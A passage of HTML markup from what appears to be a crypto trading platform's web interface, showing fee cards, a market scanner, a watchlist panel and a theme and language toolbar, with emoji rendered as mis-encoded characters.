      <div class="dash-card"><div style="font-weight:700;margin-bottom:8px">ðŸ’Ž Deposit Fees</div><div style="font-size:12px;color:var(--text2);display:flex;flex-direction:column;gap:6px"><span>Crypto: <strong style="color:var(--green)">Free</strong></span><span>M-Pesa: <strong style="color:var(--green)">Free</strong></span><span>Bank Wire: <strong style="color:var(--text1)">$5 flat</strong></span><span>Credit Card: <strong style="color:var(--text1)">1.5%</strong></span></div></div>
      <div class="dash-card"><div style="font-weight:700;margin-bottom:8px">ðŸ“¤ Withdrawal Fees</div><div style="font-size:12px;color:var(--text2);display:flex;flex-direction:column;gap:6px"><span>BTC: <strong style="color:var(--text1)">0.0003 BTC</strong></span><span>ETH: <strong style="color:var(--text1)">0.005 ETH</strong></span><span>USDT TRC20: <strong style="color:var(--text1)">1 USDT</strong></span><span>Bank Wire: <strong style="color:var(--text1)">$15</strong></span></div></div>
      <div class="dash-card"><div style="font-weight:700;margin-bottom:8px">ðŸ¤– Bot & Copy Fees</div><div style="font-size:12px;color:var(--text2);display:flex;flex-direction:column;gap:6px"><span>Grid Bot: <strong style="color:var(--green)">Free</strong></span><span>DCA Bot: <strong style="color:var(--green)">Free</strong></span><span>Copy Trading: <strong style="color:var(--text1)">8% profit share</strong></span><span>Signals: <strong style="color:var(--green)">Free (VIP)</strong></span></div></div>
    </div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• MARKET SCANNER LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="scannerLayer">
  <div style="padding:20px 24px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800">ðŸ” Market Scanner</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Find trading opportunities across all pairs in real-time</div>
      </div>
      <div style="display:flex;gap:8px;flex-wrap:wrap">
        <button class="scanner-filter active" onclick="setScannerFilter('gainers',this)">ðŸš€ Top Gainers</button>
        <button class="scanner-filter" onclick="setScannerFilter('losers',this)">ðŸ“‰ Top Losers</button>
        <button class="scanner-filter" onclick="setScannerFilter('volume',this)">ðŸ“Š High Volume</button>
        <button class="scanner-filter" onclick="setScannerFilter('new_high',this)">ðŸ”¥ Near High</button>
      </div>
    </div>
    <div class="dash-card" style="padding:0;overflow:hidden">
      <div id="scannerList"></div>
    </div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• WATCHLIST LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="watchlistLayer">
  <div style="padding:20px 24px;max-width:700px;margin:0 auto">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800">â­ Watchlist</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Monitor your favourite trading pairs</div>
      </div>
      <div style="display:flex;gap:8px;align-items:center">
        <select id="watchlistAddSelect" style="padding:7px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);color:var(--text1);font-size:12px">
          <option value="">Select pair to add...</option>
          <option>BTC/USDT</option><option>ETH/USDT</option><option>SOL/USDT</option><option>BNB/USDT</option><option>XRP/USDT</option><option>ADA/USDT</option><option>DOGE/USDT</option><option>AVAX/USDT</option><option>LINK/USDT</option><option>DOT/USDT</option>
        </select>
        <button class="btn btn-green" onclick="addWatchlistPair()">+ Add</button>
      </div>
    </div>
    <div id="watchlistItems"></div>
    <div style="margin-top:16px;padding:14px;background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);font-size:12px;color:var(--text2)">
      ðŸ’¡ <strong style="color:var(--text1)">Tip:</strong> You can also add pairs from the Charts page by clicking the â­ button on any pair. Click any watchlist item to open its chart.
    </div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• THEME + LANGUAGE TOOLBAR â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div style="position:fixed;bottom:24px;left:50%;transform:translateX(-50%);z-index:800;display:flex;gap:6px;background:var(--bg2);border:1px solid var(--border2);border-radius:20px;padding:6px 10px;box-shadow:0 8px 24px rgba(0,0,0,.4)" id="bottomToolbar">
  <button class="theme-toggle" id="themeToggleBtn" onclick="toggleTheme()">ðŸŒ™ Dark Mode</button>
  <div style="width:1px;background:var(--border);margin:0 2px"></div>
  <button class="sound-toggle" id="soundToggleBtn" onclick="toggleSound()">ðŸ”‡ Sound Off</button>
  <div style="width:1px;background:var(--border);margin:0 2px"></div>
  <button class="lang-btn active" data-lang="EN" onclick="setLanguage('EN')">EN</button>
  <button class="lang-btn" data-lang="FR" onclick="setLanguage('FR')">FR</button>
  <button class="lang-btn" data-lang="DE" onclick="setLanguage('DE')">DE</button>
  <button class="lang-btn" data-lang="ES" onclick="setLanguage('ES')">ES</button>
  <button class="lang-btn" data-lang="ZH" onclick="setLanguage('ZH')">ZH</button>
  <button class="lang-btn" data-lang="AR" onclick="setLanguage('AR')">AR</button>
  <div style="width:1px;background:var(--border);margin:0 2px"></div>
  <button class="lang-btn" onclick="startTour()" title="Platform Tour">ðŸŽ“</button>
  <button class="lang-btn" onclick="toggleFullscreenChart()" title="Fullscreen Chart">â›¶</button>
</div>

</body>
</html>
